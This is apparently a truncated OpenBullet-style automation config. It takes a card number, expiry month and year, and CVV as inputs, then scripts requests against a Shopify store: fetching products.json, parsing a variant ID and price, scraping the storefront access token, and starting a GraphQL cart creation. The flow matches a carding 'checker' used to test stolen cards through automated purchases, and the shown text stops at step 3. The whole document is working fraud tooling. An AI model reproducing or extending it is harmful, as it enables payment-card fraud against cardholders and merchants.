[SCRIPT]
#site FUNCTION Constant "<site>" -> VAR "site" 

#CC FUNCTION Constant "<cc>" -> VAR "CC" 

#MES FUNCTION Constant "<mes>" -> VAR "MES" 

#ANO FUNCTION Constant "<ano>" -> VAR "ANO" 

#CVV FUNCTION Constant "<cvv>" -> VAR "CVV" 

!#ClearCookies FUNCTION ClearCookies 

# Step 1: Fetch products.json
REQUEST GET "https://<site>/products.json" 
  
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Safari/537.36" 
  HEADER "Accept: application/json" 
  HEADER "Accept-Language: en-US,en;q=0.9" 
  HEADER "Pragma: no-cache" 

# Parse product_id and price from products.json  
# Parse variant ID (numeric, no quotes) - from first variant in products
variantid PARSE "<SOURCE>" LR "\"variants\":[{\"id\":" ",\"available\"" CreateEmpty=FALSE -> VAR "variantid" 

# Parse price - find price in the first variant (search from variants array start)
price PARSE "<SOURCE>" LR "\"variants\":[{\"id\":" "\"price\":\"" "\"," CreateEmpty=FALSE -> VAR "price" 

# Step 2: Get site homepage to extract accessToken
REQUEST GET "https://<site>" 
  
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Safari/537.36" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
  HEADER "Accept-Language: en-US,en;q=0.9" 
  HEADER "Pragma: no-cache" 

site_key PARSE "<SOURCE>" LR "\"accessToken\":\"" "\"" CreateEmpty=FALSE -> VAR "site_key" 

# Step 3: Create cart via GraphQL
REQUEST POST "https://<site>/api/unstable/graphql.json?operation_name=cartCreate" 
